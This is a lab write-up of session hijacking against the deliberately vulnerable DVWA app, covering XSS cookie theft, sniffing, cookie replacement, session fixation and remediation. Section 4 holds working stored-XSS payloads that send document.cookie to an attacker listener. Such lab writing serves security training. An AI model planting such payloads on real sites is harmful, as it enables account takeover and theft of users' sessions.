# Lab Write-Up: Session Hijacking & Cookie Theft
**Date:** 2026-09-27  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Post-Exploitation (Combined Attack Chain)  
**Category:** Broken Authentication  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures  

---

## 1. Introduction

Session Hijacking is an attack where an adversary steals a valid session token from a legitimate user and uses it to impersonate that user — bypassing the need to know their password. This write-up demonstrates a complete session hijacking attack chain in DVWA, combining XSS-based cookie theft, network sniffing, and manual session token forgery to achieve account takeover.

**Goal of this lab:** Steal the admin's session cookie using multiple techniques and use it to hijack their authenticated session in DVWA.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA (multiple modules)              |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser, Burp Suite, Python HTTP Server, Wireshark |
| **Network**      | Local lab (NAT/Host-Only)            |
| **Victim**       | Admin user logged into DVWA          |

---

## 3. Vulnerability Overview

### Session Management Weaknesses Exploited

| Weakness                  | Attack Vector           | Result               |
|---------------------------|-------------------------|----------------------|
| XSS + no HttpOnly         | Cookie theft via JS     | Session token stolen |
| Cleartext HTTP            | Network sniffing        | Cookie in plaintext  |
| Predictable session IDs   | Enumeration             | Valid token guessed  |
| No session expiry         | Long-lived token        | Old token still valid|
| Cookie without SameSite   | CSRF + cookie theft     | Cross-site abuse     |

---

## 4. Exploitation

### Method 1 – XSS-Based Cookie Theft

**Prerequisites:** XSS vulnerability in DVWA (see Stored XSS write-up), `HttpOnly` flag NOT set.

#### Step 1 – Verify Cookie Flags

Open DevTools → Application → Cookies → `PHPSESSID`:

| Cookie    | HttpOnly | Secure | SameSite |
|-----------|----------|--------|----------|
| PHPSESSID | ❌ No    | ❌ No  | None     |

No `HttpOnly` → JavaScript can read the cookie.

#### Step 2 – Start Listener

```bash
python3 -m http.server 8081
```

#### Step 3 – Deploy Stored XSS Cookie Stealer

In DVWA → XSS (Stored), inject into the message field:

```html
<script>
  fetch('http://192.168.x.x:8081/?session=' + encodeURIComponent(document.cookie))
</script>
```

Or using Image object:
```html
<script>
  new Image().src='http://192.168.x.x:8081/steal?c='+btoa(document.cookie)
</script>
```

#### Step 4 – Admin Visits the Page

When the admin loads the guestbook, the payload executes automatically.

**Listener output:**
```
"GET /steal?c=UEhQU0VTU0lEPWFiYzEyM3h5ejsgc2VjdXJpdHk9bG93 HTTP/1.1"
```

**Decode the base64:**
```bash
echo "UEhQU0VTU0lEPWFiYzEyM3h5ejsgc2VjdXJpdHk9bG93" | base64 -d
# PHPSESSID=abc123xyz; security=low
```

✅ Admin session cookie obtained: `PHPSESSID=abc123xyz`

---

### Method 2 – Network Sniffing (HTTP Traffic)

If DVWA runs over plain HTTP (not HTTPS), session cookies are transmitted in cleartext.

#### Step 1 – Start Wireshark

```bash
wireshark &
```

Select the network interface (e.g., `eth0` or `lo` for localhost).

#### Step 2 – Capture Filter

```
http && tcp.port == 80
```

#### Step 3 – Trigger a Request from the Victim

The admin performs any action in DVWA (login, page navigation).

#### Step 4 – Find the Cookie in Captured Traffic

In Wireshark → Follow TCP Stream for one of the HTTP packets:

```
GET /dvwa/index.php HTTP/1.1
Host: 192.168.x.x
Cookie: PHPSESSID=abc123xyz; security=low
```

✅ Cookie captured from network traffic.

---

### Method 3 – Manual Session Token Manipulation (Burp)

#### Step 1 – Get Your Own Session Cookie

Log into DVWA as `gordonb`. Note your session:
```
PHPSESSID=gordonb_session_token
```

#### Step 2 – Use Stolen Admin Cookie

In Burp → Proxy → Options → Match and Replace:
- Type: Request header
- Match: `Cookie:.*`
- Replace: `Cookie: PHPSESSID=abc123xyz; security=low`

All subsequent requests will use the admin's session.

#### Alternative – Browser DevTools

1. DevTools → Application → Cookies → `localhost`
2. Double-click the `PHPSESSID` value
3. Replace with the stolen admin cookie: `abc123xyz`
4. Refresh any DVWA page

**Result:** You are now authenticated as admin. ✅

---

### Method 4 – Session Fixation

Session fixation is an attack where the attacker **sets** a known session token for the victim before they log in.

#### Step 1 – Get a Valid (Pre-Login) Session

Navigate to DVWA without logging in → note the session cookie:
```
PHPSESSID=attacker_known_token
```

#### Step 2 – Send Victim a Session-Fixed URL

Craft a URL that sets the victim's session cookie:
```
http://localhost/dvwa/login.php?PHPSESSID=attacker_known_token
```

Or via email/chat with an `<a>` tag pointing to it.

#### Step 3 – Victim Logs In

If the application accepts the session cookie pre-login and **does not regenerate the session ID** after authentication, the victim's session now has `attacker_known_token`.

#### Step 4 – Attacker Uses Known Token

The attacker, who knows `attacker_known_token`, is now authenticated as the victim.

**Check DVWA:** Does it call `session_regenerate_id()` after login? No → **vulnerable to session fixation**.

---

## 5. Post-Hijacking Actions

With admin's session cookie:

```
# Access admin panel
GET /dvwa/security.php → Change security level
GET /dvwa/phpinfo.php  → Full PHP/server info
POST /dvwa/vulnerabilities/csrf/ → Change admin password permanently
GET /dvwa/setup.php    → Reset/reconfigure DVWA database
```

---

## 6. Session Cookie Security Flags Comparison

| Flag        | Protection                           | DVWA Low Level |
|-------------|--------------------------------------|----------------|
| `HttpOnly`  | Blocks JS access to cookie           | ❌ Missing     |
| `Secure`    | Cookie only sent over HTTPS          | ❌ Missing     |
| `SameSite=Strict` | Blocks cross-site requests    | ❌ Missing     |
| Short expiry| Limits hijacking window              | ❌ No expiry   |

All four protections are absent at DVWA Low level — a perfect target for session hijacking.

---

## 7. Findings Summary

| Attack Method        | Prerequisite          | Success | Cookie Obtained |
|----------------------|-----------------------|---------|-----------------|
| XSS Cookie Theft     | Stored XSS + no HttpOnly | ✅   | PHPSESSID=...   |
| Network Sniffing     | HTTP (no HTTPS)       | ✅      | PHPSESSID=...   |
| Manual Replacement   | Obtained cookie       | ✅      | Full admin access|
| Session Fixation     | No session regeneration | ✅    | Known token used |

---

## 8. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.8      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: High |

**Business Impact:**
- Full account takeover without knowing the password
- Admin access → all data accessible and modifiable
- Persistent access until session expires or password changes
- Chain with CSRF to change password → permanent takeover

---

## 9. Remediation Recommendations

| Fix                        | Description                                                       |
|----------------------------|-------------------------------------------------------------------|
| **HttpOnly Flag**          | `setcookie(..., ['httponly' => true])` — blocks JS access        |
| **Secure Flag**            | `setcookie(..., ['secure' => true])` — HTTPS only               |
| **SameSite=Strict**        | Prevents cross-site cookie sending                               |
| **HTTPS Everywhere**       | Use TLS to encrypt all traffic including cookies                 |
| **Session Regeneration**   | Call `session_regenerate_id(true)` after login                   |
| **Short Session Lifetime** | Expire sessions after 15-30 minutes of inactivity               |
| **IP/UA Binding**          | Invalidate session if IP or User-Agent changes                   |

**Secure Session Cookie (PHP):**
```php
session_start();
session_regenerate_id(true); // After authentication

setcookie(session_name(), session_id(), [
    'expires'  => time() + 1800,   // 30 minutes
    'path'     => '/',
    'secure'   => true,            // HTTPS only
    'httponly' => true,            // No JS access
    'samesite' => 'Strict'         // No cross-site
]);
```

---

## 10. References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PortSwigger – Session Hijacking](https://portswigger.net/web-security/authentication)
- [OWASP Testing for Session Fixation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation)
- [Wireshark Documentation](https://www.wireshark.org/docs/)

---

## 11. Proof of Concept (PoC) Summary

```
Target:    DVWA – All modules (session management)
Method 1:  Stored XSS → document.cookie exfiltrated → PHPSESSID=abc123xyz
Method 2:  Wireshark HTTP capture → Cookie in plaintext
Method 3:  DevTools cookie replacement → Authenticated as admin
Method 4:  Session fixation → Known token accepted post-login
Result:    Full admin account takeover without credentials
Severity:  CRITICAL (CVSS 9.8)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
